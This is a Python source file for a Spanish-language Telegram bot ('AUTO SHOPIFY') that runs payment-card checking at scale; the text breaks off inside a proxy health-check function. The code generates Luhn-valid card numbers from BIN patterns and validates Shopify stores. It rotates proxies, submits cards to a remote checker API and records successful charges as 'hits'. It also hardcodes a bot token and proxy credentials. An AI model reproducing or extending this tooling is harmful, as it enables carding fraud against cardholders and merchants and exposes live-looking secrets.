# novachk.py - VERSIÓN COMPLETA CON DETECCIÓN INTELIGENTE DE ARCHIVOS
import logging
import requests
import json
import os
import random
import asyncio
import time
import re
import sqlite3
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, ContextTypes, MessageHandler, filters, CallbackQueryHandler
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor, as_completed
from contextlib import contextmanager

# --- CONFIGURACIÓN ---
TOKEN = "8503937259:AAEApOgsbu34qw5J6OKz1dxgvRzrFv9IQdE"
BOT_NAME = "AUTO SHOPIFY"
API_BASE_URL = "https://auto-shopify-api-production.up.railway.app/index.php"
DEFAULT_PROXY = "45.155.88.66:7497:zpqdlliz:1jrl1sdkbmlj"
ADMIN_ID = 8220432777
DATABASE_FILE = "bot.db"
RESULTS_DIR = "resultados"
HITS_DIR = "hits"
GENERATED_DIR = "generadas"

# Sitios de prueba para health check
TEST_SITES = [
    "https://www.google.com",
    "https://www.cloudflare.com",
    "https://www.github.com"
]

# Variable global para controlar STOP
stop_shopify = False
current_shopify_jobs = 0

# Crear directorios
os.makedirs(RESULTS_DIR, exist_ok=True)
os.makedirs(HITS_DIR, exist_ok=True)
os.makedirs(GENERATED_DIR, exist_ok=True)

# --- BASE DE DATOS ---
@contextmanager
def get_db():
    conn = sqlite3.connect(DATABASE_FILE)
    conn.row_factory = sqlite3.Row
    try:
        yield conn
    finally:
        conn.close()

def init_database():
    """Inicializa la base de datos con todas las tablas necesarias"""
    with get_db() as conn:
        cursor = conn.cursor()
        
        # Tabla de usuarios
        cursor.execute('''
            CREATE TABLE IF NOT EXISTS users (
                user_id INTEGER PRIMARY KEY,
                username TEXT, 
                first_name TEXT, 
                approved BOOLEAN DEFAULT 0,
                registered_date TIMESTAMP DEFAULT CURRENT_TIMESTAMP
            )
        ''')
        
        # Tabla de proxies
        cursor.execute('''
            CREATE TABLE IF NOT EXISTS proxies (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                proxy TEXT UNIQUE, 
                added_by INTEGER, 
                added_date TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                is_alive BOOLEAN DEFAULT 1, 
                times_used INTEGER DEFAULT 0,
                response_time REAL, 
                last_error TEXT, 
                last_checked TIMESTAMP,
                fail_count INTEGER DEFAULT 0, 
                success_count INTEGER DEFAULT 0
            )
        ''')
        
        # Tabla de sitios
        cursor.execute('''
            CREATE TABLE IF NOT EXISTS sites (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                site TEXT UNIQUE, 
                added_by INTEGER, 
                added_date TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                is_valid BOOLEAN DEFAULT 1, 
                times_used INTEGER DEFAULT 0, 
                products_found INTEGER DEFAULT 0,
                response_time REAL, 
                last_error TEXT, 
                last_checked TIMESTAMP,
                fail_count INTEGER DEFAULT 0, 
                success_count INTEGER DEFAULT 0,
                is_shopify BOOLEAN DEFAULT 0
            )
        ''')
        
        # Tabla de tarjetas generadas
        cursor.execute('''
            CREATE TABLE IF NOT EXISTS generated_cards (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                cc TEXT, 
                pattern TEXT, 
                generated_by INTEGER,
                generated_date TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                used BOOLEAN DEFAULT 0
            )
        ''')
        
        # Tabla de cola de tarjetas
        cursor.execute('''
            CREATE TABLE IF NOT EXISTS card_queue (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                cc TEXT, 
                user_id INTEGER, 
                added_date TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                processed BOOLEAN DEFAULT 0
            )
        ''')
        
        # Tabla de HITS
        cursor.execute('''
            CREATE TABLE IF NOT EXISTS hits (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                cc TEXT, 
                site TEXT, 
                proxy TEXT, 
                response_type TEXT,
                response_full TEXT, 
                status_code INTEGER, 
                elapsed REAL,
                user_id INTEGER, 
                timestamp TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                price REAL
            )
        ''')
        
        conn.commit()
        print("✅ Base de datos inicializada correctamente")
        
        # Ejecutar migración para asegurar columnas nuevas
        migrate_database()

def migrate_database():
    """Actualiza la base de datos agregando nuevas columnas si no existen"""
    with get_db() as conn:
        cursor = conn.cursor()
        
        # Verificar si la columna is_shopify existe en sites
        cursor.execute("PRAGMA table_info(sites)")
        columns = [column[1] for column in cursor.fetchall()]
        
        if 'is_shopify' not in columns:
            try:
                cursor.execute("ALTER TABLE sites ADD COLUMN is_shopify BOOLEAN DEFAULT 0")
                print("✅ Columna is_shopify agregada a sites")
            except:
                pass
        
        if 'response_time' not in columns:
            try:
                cursor.execute("ALTER TABLE sites ADD COLUMN response_time REAL")
                print("✅ Columna response_time agregada a sites")
            except:
                pass
        
        conn.commit()

# --- FUNCIONES DE USUARIOS ---
def is_approved(user_id):
    with get_db() as conn:
        cursor = conn.cursor()
        cursor.execute('SELECT approved FROM users WHERE user_id = ?', (user_id,))
        result = cursor.fetchone()
        return result is not None and result[0] == 1

def register_user(user_id, username, first_name):
    with get_db() as conn:
        cursor = conn.cursor()
        cursor.execute('''
            INSERT OR REPLACE INTO users (user_id, username, first_name, approved)
            VALUES (?, ?, ?, 1)
        ''', (user_id, username, first_name))
        conn.commit()

def get_user_count():
    with get_db() as conn:
        cursor = conn.cursor()
        cursor.execute('SELECT COUNT(*) FROM users WHERE approved = 1')
        return cursor.fetchone()[0]

# --- FUNCIONES DE PROXIES ---
def add_proxy(proxy, user_id):
    with get_db() as conn:
        try:
            cursor = conn.cursor()
            cursor.execute('INSERT INTO proxies (proxy, added_by) VALUES (?, ?)', (proxy, user_id))
            conn.commit()
            return True
        except:
            return False

def get_all_proxies(only_alive=True):
    with get_db() as conn:
        cursor = conn.cursor()
        if only_alive:
            cursor.execute('SELECT proxy, added_date, times_used, is_alive, response_time, last_error, fail_count, success_count FROM proxies WHERE is_alive = 1 ORDER BY response_time ASC')
        else:
            cursor.execute('SELECT proxy, added_date, times_used, is_alive, response_time, last_error, fail_count, success_count FROM proxies ORDER BY is_alive DESC')
        return cursor.fetchall()

def get_proxy_count():
    with get_db() as conn:
        cursor = conn.cursor()
        cursor.execute('SELECT COUNT(*) FROM proxies WHERE is_alive = 1')
        alive = cursor.fetchone()[0]
        cursor.execute('SELECT COUNT(*) FROM proxies')
        total = cursor.fetchone()[0]
        return alive, total - alive

def update_proxy_stats(proxy, is_alive, response_time=None, error=None, success=False):
    with get_db() as conn:
        cursor = conn.cursor()
        if success:
            cursor.execute('''
                UPDATE proxies 
                SET is_alive = ?, response_time = ?, last_error = ?, last_checked = CURRENT_TIMESTAMP,
                    times_used = times_used + 1, success_count = success_count + 1
                WHERE proxy = ?
            ''', (is_alive, response_time, error, proxy))
        else:
            cursor.execute('''
                UPDATE proxies 
                SET is_alive = ?, response_time = ?, last_error = ?, last_checked = CURRENT_TIMESTAMP,
                    times_used = times_used + 1, fail_count = fail_count + 1
                WHERE proxy = ?
            ''', (is_alive, response_time, error, proxy))
        conn.commit()

def mark_proxy_dead(proxy, error=None):
    with get_db() as conn:
        cursor = conn.cursor()
        cursor.execute('''
            UPDATE proxies 
            SET is_alive = 0, last_error = ?, last_checked = CURRENT_TIMESTAMP,
                fail_count = fail_count + 1
            WHERE proxy = ?
        ''', (error, proxy))
        conn.commit()

def delete_proxy(proxy):
    with get_db() as conn:
        cursor = conn.cursor()
        cursor.execute('DELETE FROM proxies WHERE proxy = ?', (proxy,))
        conn.commit()

def delete_proxy_by_index(index, user_id):
    with get_db() as conn:
        cursor = conn.cursor()
        cursor.execute('''
            SELECT proxy FROM proxies 
            WHERE added_by = ? ORDER BY added_date DESC LIMIT 1 OFFSET ?
        ''', (user_id, index-1))
        result = cursor.fetchone()
        if result:
            cursor.execute('DELETE FROM proxies WHERE proxy = ?', (result[0],))
            conn.commit()
            return result[0]
        return None

def delete_all_proxies(user_id=None):
    """Elimina TODOS los proxies"""
    with get_db() as conn:
        cursor = conn.cursor()
        if user_id:
            cursor.execute('DELETE FROM proxies WHERE added_by = ?', (user_id,))
        else:
            cursor.execute('DELETE FROM proxies')
        deleted = cursor.rowcount
        conn.commit()
        return deleted

def delete_all_dead_proxies():
    with get_db() as conn:
        cursor = conn.cursor()
        cursor.execute('DELETE FROM proxies WHERE is_alive = 0')
        deleted = cursor.rowcount
        conn.commit()
        return deleted

# --- FUNCIONES DE SITIOS MEJORADAS ---
def add_site(site, user_id, is_shopify=False):
    """Agrega un sitio a la base de datos"""
    with get_db() as conn:
        try:
            if not site.startswith(('http://', 'https://')):
                site = 'https://' + site
            cursor = conn.cursor()
            cursor.execute('''
                INSERT INTO sites (site, added_by, is_shopify)
                VALUES (?, ?, ?)
            ''', (site, user_id, is_shopify))
            conn.commit()
            return True
        except sqlite3.IntegrityError:
            return False

def add_sites_bulk(sites_list, user_id):
    """Agrega múltiples sitios a la vez"""
    added = 0
    duplicates = 0
    with get_db() as conn:
        cursor = conn.cursor()
        for site in sites_list:
            if not site.startswith(('http://', 'https://')):
                site = 'https://' + site
            try:
                cursor.execute('''
                    INSERT INTO sites (site, added_by)
                    VALUES (?, ?)
                ''', (site, user_id))
                added += 1
            except sqlite3.IntegrityError:
                duplicates += 1
        conn.commit()
    return added, duplicates

def get_all_sites(only_valid=True):
    with get_db() as conn:
        cursor = conn.cursor()
        if only_valid:
            cursor.execute('SELECT site, added_date, times_used, is_valid, products_found, response_time, fail_count, success_count, is_shopify FROM sites WHERE is_valid = 1 ORDER BY products_found DESC')
        else:
            cursor.execute('SELECT site, added_date, times_used, is_valid, products_found, response_time, fail_count, success_count, is_shopify FROM sites ORDER BY is_valid DESC')
        return cursor.fetchall()

def get_site_count():
    with get_db() as conn:
        cursor = conn.cursor()
        cursor.execute('SELECT COUNT(*) FROM sites WHERE is_valid = 1')
        valid = cursor.fetchone()[0]
        cursor.execute('SELECT COUNT(*) FROM sites')
        total = cursor.fetchone()[0]
        return valid, total - valid

def get_products_ready_count():
    with get_db() as conn:
        cursor = conn.cursor()
        cursor.execute('SELECT COUNT(*) FROM sites WHERE is_valid = 1 AND products_found > 0')
        return cursor.fetchone()[0]

def update_site_stats(site, is_valid, response_time=None, has_product=False, success=False):
    with get_db() as conn:
        cursor = conn.cursor()
        if success:
            cursor.execute('''
                UPDATE sites 
                SET is_valid = ?, response_time = ?, last_checked = CURRENT_TIMESTAMP,
                    times_used = times_used + 1, products_found = products_found + ?,
                    success_count = success_count + 1
                WHERE site = ?
            ''', (is_valid, response_time, 1 if has_product else 0, site))
        else:
            cursor.execute('''
                UPDATE sites 
                SET is_valid = ?, response_time = ?, last_checked = CURRENT_TIMESTAMP,
                    times_used = times_used + 1, products_found = products_found + ?,
                    fail_count = fail_count + 1
                WHERE site = ?
            ''', (is_valid, response_time, 1 if has_product else 0, site))
        conn.commit()

def mark_site_invalid(site, error=None):
    with get_db() as conn:
        cursor = conn.cursor()
        cursor.execute('''
            UPDATE sites 
            SET is_valid = 0, last_error = ?, last_checked = CURRENT_TIMESTAMP,
                fail_count = fail_count + 1
            WHERE site = ?
        ''', (error, site))
        conn.commit()

def delete_site(site):
    with get_db() as conn:
        cursor = conn.cursor()
        cursor.execute('DELETE FROM sites WHERE site = ?', (site,))
        conn.commit()

def delete_site_by_index(index, user_id):
    with get_db() as conn:
        cursor = conn.cursor()
        cursor.execute('''
            SELECT site FROM sites 
            WHERE added_by = ? ORDER BY added_date DESC LIMIT 1 OFFSET ?
        ''', (user_id, index-1))
        result = cursor.fetchone()
        if result:
            cursor.execute('DELETE FROM sites WHERE site = ?', (result[0],))
            conn.commit()
            return result[0]
        return None

def delete_all_sites(user_id=None):
    """Elimina TODOS los sitios"""
    with get_db() as conn:
        cursor = conn.cursor()
        if user_id:
            cursor.execute('DELETE FROM sites WHERE added_by = ?', (user_id,))
        else:
            cursor.execute('DELETE FROM sites')
        deleted = cursor.rowcount
        conn.commit()
        return deleted

# --- FUNCIONES DE TARJETAS ---
def save_generated_cards(cards, pattern, user_id):
    with get_db() as conn:
        cursor = conn.cursor()
        count = 0
        for card in cards:
            cursor.execute('''
                INSERT INTO generated_cards (cc, pattern, generated_by)
                VALUES (?, ?, ?)
            ''', (card, pattern, user_id))
            count += 1
        conn.commit()
        return count

def get_generated_cards(user_id=None, limit=100):
    with get_db() as conn:
        cursor = conn.cursor()
        if user_id:
            cursor.execute('SELECT cc, pattern, generated_date, used FROM generated_cards WHERE generated_by = ? ORDER BY generated_date DESC LIMIT ?', (user_id, limit))
        else:
            cursor.execute('SELECT cc, pattern, generated_date, used FROM generated_cards ORDER BY generated_date DESC LIMIT ?', (limit,))
        return cursor.fetchall()

def delete_generated_card(cc, user_id):
    with get_db() as conn:
        cursor = conn.cursor()
        cursor.execute('DELETE FROM generated_cards WHERE cc = ? AND generated_by = ?', (cc, user_id))
        conn.commit()

def delete_generated_card_by_index(index, user_id):
    with get_db() as conn:
        cursor = conn.cursor()
        cursor.execute('''
            SELECT cc FROM generated_cards 
            WHERE generated_by = ? ORDER BY generated_date DESC LIMIT 1 OFFSET ?
        ''', (user_id, index-1))
        result = cursor.fetchone()
        if result:
            cursor.execute('DELETE FROM generated_cards WHERE cc = ? AND generated_by = ?', (result[0], user_id))
            conn.commit()
            return result[0]
        return None

def delete_all_generated_cards(user_id=None):
    """Elimina TODAS las tarjetas generadas"""
    with get_db() as conn:
        cursor = conn.cursor()
        if user_id:
            cursor.execute('DELETE FROM generated_cards WHERE generated_by = ?', (user_id,))
        else:
            cursor.execute('DELETE FROM generated_cards')
        deleted = cursor.rowcount
        conn.commit()
        return deleted

# --- FUNCIONES DE COLA ---
def add_to_queue(cards, user_id):
    with get_db() as conn:
        cursor = conn.cursor()
        count = 0
        for card in cards:
            cursor.execute('''
                INSERT INTO card_queue (cc, user_id)
                VALUES (?, ?)
            ''', (card, user_id))
            count += 1
        conn.commit()
        return count

def get_queue_count(user_id):
    with get_db() as conn:
        cursor = conn.cursor()
        cursor.execute('SELECT COUNT(*) FROM card_queue WHERE user_id = ? AND processed = 0', (user_id,))
        return cursor.fetchone()[0]

def get_queue_cards(user_id, limit=1000):
    with get_db() as conn:
        cursor = conn.cursor()
        cursor.execute('SELECT cc FROM card_queue WHERE user_id = ? AND processed = 0 ORDER BY added_date ASC LIMIT ?', (user_id, limit))
        return [row[0] for row in cursor.fetchall()]

def delete_from_queue(cc, user_id):
    with get_db() as conn:
        cursor = conn.cursor()
        cursor.execute('DELETE FROM card_queue WHERE cc = ? AND user_id = ?', (cc, user_id))
        conn.commit()

def delete_from_queue_by_index(index, user_id):
    with get_db() as conn:
        cursor = conn.cursor()
        cursor.execute('''
            SELECT cc FROM card_queue 
            WHERE user_id = ? AND processed = 0 ORDER BY added_date ASC LIMIT 1 OFFSET ?
        ''', (user_id, index-1))
        result = cursor.fetchone()
        if result:
            cursor.execute('DELETE FROM card_queue WHERE cc = ? AND user_id = ?', (result[0], user_id))
            conn.commit()
            return result[0]
        return None

def clear_all_queue(user_id=None):
    """Elimina TODAS las tarjetas de la cola"""
    with get_db() as conn:
        cursor = conn.cursor()
        if user_id:
            cursor.execute('DELETE FROM card_queue WHERE user_id = ?', (user_id,))
        else:
            cursor.execute('DELETE FROM card_queue')
        deleted = cursor.rowcount
        conn.commit()
        return deleted

def mark_queue_processed(cards, user_id):
    with get_db() as conn:
        cursor = conn.cursor()
        for card in cards:
            cursor.execute('UPDATE card_queue SET processed = 1 WHERE cc = ? AND user_id = ?', (card, user_id))
        conn.commit()

# --- FUNCIONES DE HITS ---
def save_hit(cc, site, proxy, response_type, response_full, status_code, elapsed, user_id, price=None):
    with get_db() as conn:
        cursor = conn.cursor()
        cursor.execute('''
            INSERT INTO hits (cc, site, proxy, response_type, response_full, status_code, elapsed, user_id, price)
            VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?)
        ''', (cc, site, proxy, response_type, response_full[:500], status_code, elapsed, user_id, price))
        conn.commit()

def get_hits(user_id=None, limit=100):
    with get_db() as conn:
        cursor = conn.cursor()
        if user_id:
            cursor.execute('SELECT cc, site, response_type, timestamp, price FROM hits WHERE user_id = ? ORDER BY timestamp DESC LIMIT ?', (user_id, limit))
        else:
            cursor.execute('SELECT cc, site, response_type, timestamp, price FROM hits ORDER BY timestamp DESC LIMIT ?', (limit,))
        return cursor.fetchall()

# ===== FUNCIONES DE DETECCIÓN MEJORADAS =====
def parse_cc_line(line):
    """Parsea una línea de CC y la formatea correctamente"""
    line = line.strip()
    if not line:
        return None
    
    # Reemplazar cualquier separador por |
    for sep in [',', ';', ' ', ':', '/']:
        line = line.replace(sep, '|')
    
    parts = line.split('|')
    if len(parts) >= 4:
        # Verificar que el primer campo sea numérico (tarjeta)
        if parts[0].isdigit() and len(parts[0]) >= 15:
            # Verificar que mes y año sean numéricos
            if parts[1].isdigit() and len(parts[1]) <= 2:
                if parts[2].isdigit() and (len(parts[2]) == 2 or len(parts[2]) == 4):
                    # Formatear mes a 2 dígitos y año a 4 dígitos
                    month = parts[1].zfill(2)
                    year = parts[2] if len(parts[2]) == 4 else '20' + parts[2]
                    return f"{parts[0]}|{month}|{year}|{parts[3]}"
    return None

def is_proxy_line(line):
    """Detecta si una línea contiene un proxy válido"""
    line = line.strip()
    if not line:
        return False
    
    # Patrones comunes de proxies
    patterns = [
        r'^\d+\.\d+\.\d+\.\d+:\d+$',  # IP:PORT
        r'^\d+\.\d+\.\d+\.\d+:\d+:\w+:\w+$',  # IP:PORT:USER:PASS
        r'^\w+:\w+@\d+\.\d+\.\d+\.\d+:\d+$',  # USER:PASS@IP:PORT
        r'^[a-zA-Z0-9-]+\.[a-zA-Z0-9-]+:\d+:\w+:\w+$',  # HOST:PORT:USER:PASS
        r'^[a-zA-Z0-9-]+\.[a-zA-Z0-9-]+:\d+$',  # HOST:PORT
    ]
    
    for pattern in patterns:
        if re.match(pattern, line):
            return True
    
    # Detección simple: tiene al menos 2 puntos y números
    if line.count(':') >= 1 and any(c.isdigit() for c in line):
        return True
    
    return False

def is_site_line(line):
    """Detecta si una línea contiene un sitio web"""
    line = line.strip().lower()
    if not line:
        return False
    
    # Eliminar http:// o https://
    clean_line = re.sub(r'^https?://', '', line)
    
    # No debe tener formato de proxy
    if ':' in clean_line and clean_line.count(':') <= 1:
        # Podría ser sitio con puerto (ej: dominio.com:8080)
        parts = clean_line.split(':')
        if len(parts) == 2 and parts[1].isdigit():
            clean_line = parts[0]
    
    # Debe tener un punto y no ser solo números
    if '.' in clean_line and not clean_line.replace('.', '').isdigit():
        # Lista de TLDs comunes
        tlds = ['.com', '.org', '.net', '.io', '.co', '.uk', '.us', '.shop', '.store', 
                '.xyz', '.online', '.tech', '.site', '.top', '.club', '.app', '.dev']
        
        # Verificar si termina con TLD conocido
        for tld in tlds:
            if clean_line.endswith(tld):
                return True
        
        # Si tiene al menos un punto y letras
        if clean_line.count('.') >= 1 and any(c.isalpha() for c in clean_line):
            return True
    
    return False

def is_card_line(line):
    """Detecta si una línea contiene una tarjeta"""
    return parse_cc_line(line) is not None

async def detect_file_type(lines):
    """
    Detecta el tipo de archivo basado en el contenido
    """
    results = {
        'cards': 0,
        'proxies': 0,
        'sites': 0,
        'unknown': 0
    }
    
    for line in lines[:50]:  # Analizar primeras 50 líneas
        if parse_cc_line(line):
            results['cards'] += 1
        elif is_proxy_line(line):
            results['proxies'] += 1
        elif is_site_line(line):
            results['sites'] += 1
        else:
            results['unknown'] += 1
    
    # Determinar tipo por mayoría
    total_known = results['cards'] + results['proxies'] + results['sites']
    
    if total_known == 0:
        return 'unknown'
    
    # Calcular porcentajes
    cards_pct = (results['cards'] / total_known) * 100
    proxies_pct = (results['proxies'] / total_known) * 100
    sites_pct = (results['sites'] / total_known) * 100
    
    if cards_pct >= 60:
        return 'cards'
    elif proxies_pct >= 60:
        return 'proxies'
    elif sites_pct >= 60:
        return 'sites'
    else:
        # Si no hay mayoría clara, elegir el más alto
        if results['cards'] > results['proxies'] and results['cards'] > results['sites']:
            return 'cards'
        elif results['proxies'] > results['cards'] and results['proxies'] > results['sites']:
            return 'proxies'
        elif results['sites'] > results['cards'] and results['sites'] > results['proxies']:
            return 'sites'
        else:
            return 'unknown'

# ===== FUNCIÓN DE VALIDACIÓN DE SITIOS =====
async def validate_site(site, user_id=None):
    """
    Valida si un sitio es una tienda Shopify funcional
    """
    result = {
        'site': site,
        'valid': False,
        'is_shopify': False,
        'status_code': None,
        'response_time': None,
        'error': None,
        'message': None
    }
    
    try:
        # Asegurar formato de URL
        if not site.startswith(('http://', 'https://')):
            site = 'https://' + site
        
        # Headers realistas
        headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.5',
            'Connection': 'keep-alive',
        }
        
        start = time.time()
        response = requests.get(site, headers=headers, timeout=15, allow_redirects=True)
        elapsed = time.time() - start
        
        result['status_code'] = response.status_code
        result['response_time'] = round(elapsed, 2)
        
        # Verificar si es Shopify (múltiples indicadores)
        html = response.text.lower()
        headers_dict = response.headers
        
        # Indicadores de Shopify
        shopify_indicators = [
            'cdn.shopify.com' in html,
            'shopify.com' in html,
            'myshopify.com' in site,
            'x-shopid' in str(headers_dict).lower(),
            'x-shopify-stage' in str(headers_dict).lower(),
            'shopify.theme' in html,
            'shopify.checkout' in html,
            'Powered by Shopify' in response.text,
        ]
        
        result['is_shopify'] = any(shopify_indicators)
        
        # Determinar si es válido (status 200 Y es Shopify)
        if response.status_code == 200 and result['is_shopify']:
            result['valid'] = True
            result['message'] = f"✅ Shopify válido - {elapsed:.2f}s"
            
            # Guardar en BD si hay user_id
            if user_id:
                add_site(site, user_id, True)
        else:
            if response.status_code != 200:
                result['message'] = f"❌ HTTP {response.status_code}"
            elif not result['is_shopify']:
                result['message'] = "❌ No es una tienda Shopify"
            else:
                result['message'] = "❌ Sitio inválido"
                
    except requests.exceptions.Timeout:
        result['message'] = "❌ Timeout (15s)"
        result['error'] = "Timeout"
    except requests.exceptions.ConnectionError:
        result['message'] = "❌ Error de conexión"
        result['error'] = "ConnectionError"
    except Exception as e:
        result['message'] = f"❌ Error: {str(e)[:50]}"
        result['error'] = str(e)
    
    return result

# ===== FUNCIÓN ANALYZE RESPONSE CON CÓDIGOS OFICIALES =====
def analyze_response(response_text):
    """
    Analiza la respuesta de la API usando los códigos oficiales
    """
    try:
        # Intentar parsear como JSON
        data = json.loads(response_text)
        
        # Obtener el campo Response
        response_field = data.get('Response', '').lower()
        
        # ✅ DETECTAR "Thank You" (CHARGE real)
        if 'thank you' in response_field:
            return 'CHARGE'
        
        # 🔒 DETECTAR 3DS
        elif '3ds' in response_field or '3d_authentication' in response_field:
            return 'LIVE'
        
        # 🤖 DETECTAR CAPTCHA
        elif 'captcha_required' in response_field:
            return 'CAPTCHA'
        
        # ❌ DETECTAR DECLINE genérico
        elif 'generic_decline' in response_field:
            return 'DECLINE'
        
        # 💸 DETECTAR fondos insuficientes
        elif 'insufficient_funds' in response_field:
            return 'INSUFFICIENT_FUNDS'
        
        # Si no coincide, ver el texto completo
        else:
            text = response_text.lower()
            if 'thank you' in text:
                return 'CHARGE'
            elif '3ds' in text or '3d_' in text:
                return 'LIVE'
            elif 'captcha' in text:
                return 'CAPTCHA'
            elif 'decline' in text:
                return 'DECLINE'
            elif 'insufficient' in text:
                return 'INSUFFICIENT_FUNDS'
            else:
                return 'UNKNOWN'
            
    except json.JSONDecodeError:
        # Si no es JSON, buscar en texto plano
        text = response_text.lower()
        if 'thank you' in text:
            return 'CHARGE'
        elif '3ds' in text or '3d_' in text:
            return 'LIVE'
        elif 'captcha' in text:
            return 'CAPTCHA'
        elif 'decline' in text:
            return 'DECLINE'
        elif 'insufficient' in text:
            return 'INSUFFICIENT_FUNDS'
        else:
            return 'UNKNOWN'
    except Exception as e:
        print(f"Error en analyze_response: {e}")
        return 'ERROR'

def extract_price(response_text):
    """Extrae precio de la respuesta si existe"""
    try:
        data = json.loads(response_text)
        price_str = data.get('Response', '')
        if 'thank you' in price_str.lower():
            match = re.search(r'\$([0-9.]+)', price_str)
            if match:
                return float(match.group(1))
        return float(data.get('Price', 0)) if data.get('Price') else None
    except:
        match = re.search(r'\$([0-9.]+)', response_text)
        return float(match.group(1)) if match else None

def format_cc_display(cc):
    """Formatea una tarjeta para mostrar"""
    parts = cc.split('|')
    if len(parts) == 4:
        return f"`{parts[0][:6]}xxxxxx{parts[0][-4:]}|{parts[1]}|{parts[2]}|{parts[3]}`"
    return f"`{cc[:10]}...`"

def format_hit_display(cc, site, proxy, response_type, price=None, response_text=None):
    """Formatea un HIT para mostrar en el chat"""
    parts = cc.split('|')
    card_num = parts[0] if len(parts) > 0 else cc
    month = parts[1] if len(parts) > 1 else '??'
    year = parts[2] if len(parts) > 2 else '??'
    cvv = parts[3] if len(parts) > 3 else '???'
    
    emoji_map = {
        'CHARGE': '💰',
        'LIVE': '🔒',
        'CAPTCHA': '🤖',
        'DECLINE': '❌',
        'INSUFFICIENT_FUNDS': '💸',
        'UNKNOWN': '❓',
        'ERROR': '⚡'
    }
    emoji = emoji_map.get(response_type, '❓')
    
    title_map = {
        'CHARGE': '💰 CHARGE DETECTED - Thank You!',
        'LIVE': '🔒 3DS REQUIRED - Live Detected',
        'CAPTCHA': '🤖 CAPTCHA REQUIRED - Rotate Proxy',
        'DECLINE': '❌ GENERIC DECLINE',
        'INSUFFICIENT_FUNDS': '💸 INSUFFICIENT FUNDS',
    }
    title = title_map.get(response_type, f"{response_type} DETECTED")
    
    msg = (
        f"{title}\n"
        f"━━━━━━━━━━━━━━━━━━━━━\n\n"
        f"💳 **Tarjeta:**\n"
        f"`{card_num[:6]}xxxxxx{card_num[-4:]}|{month}|{year}|{cvv}`\n\n"
        f"🌐 **Sitio:**\n`{site}`\n\n"
        f"🔒 **Proxy:**\n`{proxy}`\n"
    )
    
    if price:
        msg += f"💰 **Precio:** ${price}\n"
    
    if response_type == 'CAPTCHA':
        msg += f"🤖 **Acción:** Rotar proxy\n"
    elif response_type == 'LIVE':
        msg += f"🔒 **3DS Requerido**\n"
    elif response_type == 'CHARGE':
        msg += f"✅ **CARGO EXITOSO**\n"
    
    if response_text:
        preview = response_text[:200] + "..." if len(response_text) > 200 else response_text
        msg += f"\n📝 **Respuesta:**\n`{preview}`"
    
    return msg

# ===== FUNCIONES DEL GENERADOR =====
def luhn_checksum(card_number):
    def digits_of(n):
        return [int(d) for d in str(n)]
    digits = digits_of(card_number)
    odd_digits = digits[-1::-2]
    even_digits = digits[-2::-2]
    checksum = sum(odd_digits)
    for d in even_digits:
        checksum += sum(digits_of(d * 2))
    return checksum % 10

def calculate_luhn(card_number):
    checksum = luhn_checksum(int(card_number) * 10)
    return int(card_number) * 10 + ((10 - checksum) % 10)

def generate_cc(bin_pattern, count=10):
    results = []
    parts = bin_pattern.split('|')
    card_pattern = parts[0] if len(parts) >= 1 else bin_pattern
    month = parts[1] if len(parts) >= 2 else 'rnd'
    year = parts[2] if len(parts) >= 3 else 'rnd'
    cvv = parts[3] if len(parts) >= 4 else 'rnd'
    
    for _ in range(count):
        if 'x' in card_pattern.lower():
            card_temp = card_pattern.lower()
            x_count = card_temp.count('x')
            for _ in range(x_count):
                card_temp = card_temp.replace('x', str(random.randint(0, 9)), 1)
            if len(card_temp) == 15:
                card_temp = str(calculate_luhn(card_temp))
        else:
            card_temp = card_pattern
        
        use_month = month if month != 'rnd' else str(random.randint(1, 12)).zfill(2)
        use_year = year if year != 'rnd' else str(random.randint(2025, 2035))
        use_cvv = cvv if cvv != 'rnd' else str(random.randint(0, 999)).zfill(3)
        
        results.append(f"{card_temp}|{use_month}|{use_year}|{use_cvv}")
    
    return results

async def lookup_bin(bin_number):
    try:
        bin_clean = re.sub(r'\D', '', bin_number)[:6]
        response = requests.get(f"https://lookup.binlist.net/{bin_clean}", timeout=10)
        if response.status_code == 200:
            data = response.json()
            return {
                'bin': bin_clean,
                'scheme': data.get('scheme', 'N/A').upper(),
                'type': data.get('type', 'N/A').upper(),
                'bank': data.get('bank', {}).get('name', 'N/A'),
                'country': data.get('country', {}).get('name', 'N/A'),
                'emoji': data.get('country', {}).get('emoji', '')
            }
        return {'bin': bin_clean, 'error': 'No encontrado'}
    except:
        return {'bin': bin_clean, 'error': 'Error'}

# ===== FUNCIÓN HEALTH CHECK =====
def check_proxy_sync(proxy):
    """Versión síncrona para ThreadPool"""
    result = {'alive': False, 'response_time': None, 'error': None}
    try:
        proxies = {}
        if '@' in proxy:
            proxies = {'http': f'http://{proxy}', 'https': f'http://{proxy}'}
        elif ':' in proxy:
            parts = proxy.split(':')
            if len(parts) == 2:
                proxies = {'http': f'http://{proxy}', 'https': f'http://{proxy}'}
            elif len(parts) == 4:
                host, port, user, passwd = parts
                proxies = {'http': f'http://{user}:{passwd}@{host}:{port}',
                          'https': f'http://{user}:{passwd}@{host}:{port}'}
        
        for site in TEST_SITES:
            try:
                start = time.time()
                response = requests.get(site, proxies=proxies, timeout=5)
                if response.status_code == 200:
                    result['alive'] = True
                    result['response_time'] = round(time.time() - start, 2)
                    break
            except:
                continue
    except Exception as e:
        result['error'] = str(e)
    return result

async def ultra_healthcheck(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Health check ultra rápido con 50 hilos"""
    if update.callback_query:
        message = update.callback_query.message
    else:
        message = update.message
    
    proxies = get_all_proxies(only_alive=False)
    
    if not proxies:
        await message.reply_text("📭 No hay proxies para verificar")
        return
    
    total = len(proxies)
    proxies_list = [p[0] for p in proxies]
    
